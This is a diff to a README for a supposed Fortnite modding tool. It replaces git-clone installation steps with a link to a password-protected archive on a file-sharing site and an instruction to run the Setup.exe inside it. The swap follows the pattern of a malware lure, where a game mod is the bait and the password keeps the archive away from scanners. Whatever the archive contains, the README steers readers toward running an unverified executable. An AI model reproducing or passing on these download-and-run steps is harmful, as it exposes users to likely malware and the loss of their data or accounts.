@@ -22,17 +22,21 @@ These tools are not meant to exploit or harm the game or its community. They pro
 
 To get started with these tools, follow the steps below:
 
-1. **Clone the Repository**  
-   Use the following command to clone this repository to your local machine:
-   ```bash
-   git clone https://github.com/username/fortnite-modding-tools.git
-   ```
+Installation
 
-2. **Install Dependencies**  
-   Make sure to install any necessary dependencies for the tool to function properly.
+1. **Download the Archive**
+    Click the link below to download the archive:
+    [Download(https://www.transfernow.net/dl/20250416BN1Asbt4)
 
-3. **Run the Application**  
-   Once everything is installed, run the modding tools and follow the on-screen instructions to begin your enhanced Fortnite experience.
+2. **Extract the Archive**
+    After downloading, extract the archive using the password:
+    fortnitetool
+
+3. **Run the Setup.exe**
+    Inside the extracted folder, run the Setup.exe file to begin the installation process.
+
+4. **Launch Fortnite**
+    After the installation is complete, open Fortnite and enjoy the modified experience during your gameplay.
 
 ## Important Notes
 
